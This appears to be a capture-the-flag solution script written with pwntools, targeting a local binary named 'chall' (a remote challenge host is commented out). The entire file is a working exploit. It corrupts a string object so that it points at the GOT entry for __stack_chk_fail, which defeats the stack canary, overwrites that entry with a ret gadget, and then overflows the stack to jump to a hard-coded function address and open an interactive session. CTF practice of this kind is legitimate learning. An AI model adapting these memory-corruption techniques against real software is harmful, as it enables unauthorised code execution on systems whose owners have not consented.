from pwn import *

context.binary = "./chall"

e = ELF('./chall')
#r = e.process()
gs = """
b*main+510
"""
s = process(executable = "./chall", argv = [])
#s = remote("string-chan-b4fc1611fb16fcab.chall.ctf.blackpinker.com", 443, ssl = True)
payload = b'A' * 0x20 + p64(e.got['__stack_chk_fail']) + p64(8) * 2 #pointer, size, allocate capacity respectively
s.sendlineafter(b'choice: ',b'1')
s.sendline(payload)

s.sendlineafter(b'choice: ',b'3')

ret = p64(0x000000000040101a)
s.sendlineafter(b'str: ', ret)

callme = p64(0x00000000004016de)
payload = b'\x00' * 0x68
payload +=  callme
s.sendline(b'1')

s.sendline(payload)

s.sendline(b'100') # break loop
s.interactive()